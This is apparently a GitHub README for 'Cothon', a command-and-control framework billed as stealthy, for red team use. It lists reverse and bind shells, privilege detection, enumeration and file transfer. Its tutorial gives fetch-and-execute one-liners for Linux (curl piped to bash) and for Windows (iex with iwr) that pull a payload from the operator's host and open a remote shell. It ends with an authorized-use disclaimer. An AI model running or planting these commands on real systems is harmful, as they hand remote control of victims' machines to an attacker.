<p align="left">
  <img src="https://img.shields.io/badge/Cothon%20Framework-FF69B4?style=for-the-badge&logo=appveyor" alt="Cothon Framework">
</p>



![image](https://github.com/user-attachments/assets/f0bff41e-d932-49ba-b49c-214c5edbcdc6)

 
 <i>Cothon is a stealthy C2 framework built for ethical hacking and red team operations.</i>

## Features

    - Windows & Linux reverse/bind shells

    - Real-time process monitoring, privilege detection, background/foreground control

    - File transfers, SSL/TLS support, rate-limited HTTP(S) payload server

    - User enumeration, service vulnerability detection, file system exploration

    - Dead shell cleanup, encrypted logs, secured shell

## Tutorial

1. Fire it up
``` bash
python cothon.py --lhost YOUR_IP --ssl
```
2. Get shells<br>

Linux
``` bash
curl YOUR_IP/linux/1337 | bash
```
  Windows
``` bash
iex (iwr YOUR_IP/windows/1337)
```

  ## Screenshots

  ![image](https://github.com/user-attachments/assets/91a53d6e-6f81-4428-8226-9844ec1ca325)
<b>Main Interface<b> <br>
![image](https://github.com/user-attachments/assets/3cf04309-a627-4851-8451-db808cfb97e8)
<br><b> Shells List<b>
![image](https://github.com/user-attachments/assets/9217d5e3-8794-48ab-b1cd-4e221b77d8f0)
<br><b> Shell Menu<b>
![image](https://github.com/user-attachments/assets/bc395999-ccab-4421-a14a-123072d38853)


## Disclaimer <br>
 <b>Warning</b>: Use only for authorized testing. Never deploy without permission. Developers assume no liability for misuse.
